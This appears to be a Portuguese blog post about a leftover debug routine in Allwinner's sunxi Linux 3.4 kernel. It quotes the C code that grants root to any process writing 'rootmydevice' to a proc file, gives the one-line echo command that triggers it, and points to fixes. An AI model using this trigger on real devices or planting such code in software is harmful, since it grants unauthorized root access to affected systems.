---
layout: post
title: "Allwinner e seu código de debug"
tags: Debug, segurança, noob, kernel, allwinner, backdoor, teste
---

Sabe aqueles códigos que inserimos nos projetos apenas para debug? Aqueles que você coloca temporariamente para ficar mais fácil testar algumas funções, para conseguir fazer algumas coisas de maneira mais rápida e testar. Pois então, o **grande** problema é quando esquecemos de apagar esses códigos e eles vão para produção.

Isso pode acontecer com todo mundo, apesar de ser nada legal. Veja o que o pessoal do desenvolvimento do kernel da [Allwinner](http://www.allwinnertech.com/), fabicante chinesa de processadores, [fez](https://github.com/allwinner-zh/linux-3.4-sunxi/blob/bd5637f7297c6abf78f93b31fc1dd33f2c1a9f76/arch/arm/mach-sunxi/sunxi-debug.c#L41).

<!-- more -->

{% highlight C %}
if(!strncmp("rootmydevice",(char*)buf,12)){
	cred = (struct cred *)__task_cred(current);
	cred->uid = 0;
	cred->gid = 0;
	cred->suid = 0;
	cred->euid = 0;
	cred->euid = 0;
	cred->egid = 0;
	cred->fsuid = 0;
	cred->fsgid = 0;
	printk("now you are root\n");
}
{% endhighlight %}

Isso permite que qualquer usuário em qualquer processo se torne root do dispositivo. <Insira uma cara de espanto aqui>

Os processadores da Allwinner estão presentes em TVs, e-readers, tablets, e nos famosos [Banana Pi](http://www.bananapi.org/p/product.html) e [Orange Pi](http://www.orangepi.org/).

Segundo algumas notícias [1](http://www.theregister.co.uk/2016/05/09/allwinners_allloser_custom_kernel_has_a_nasty_root_backdoor/) e [2](https://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/), para acessar esse "backdoor" e se tranformar em <s>super</s> **root** simplesmente digite:

```bash
echo "rootmydevice" > /proc/sunxi_debug/sunxi_debug
```

Tchãran. *"now you are root\n"*

Como não tenho nenhum dispositivo com allwinner não consegui testar =(.

IMHO, não creio que este é um backdoor ou algo que foi colocado propositalmente. Pois não é algo escondido no código. pelo contrário, está muito visível. E só funciona em algumas versões dos processadores
(H3, A83T ou H8) e ainda apenas na versão de kernel 3.4.

Acredito que este problema ocorreu devido a falta de atenção dos desenvolvedores. É uma prática normal inserir estes tipos de códigos durante o desenvolvimento, mas não <s>é normal</s> deixá-los nas versões de liberação, pelo menos não de maneira **tão** explicita.

[Correções](https://github.com/friendlyarm/h3_lichee/commit/5d4d02b1c8f336ba002eed4d97dee3a51ea76cdd) estão surgindo para resolver este problema. Afinal, isso é extremamente necessário! Caso contrário, o dispositivo é altamente vulnerável.
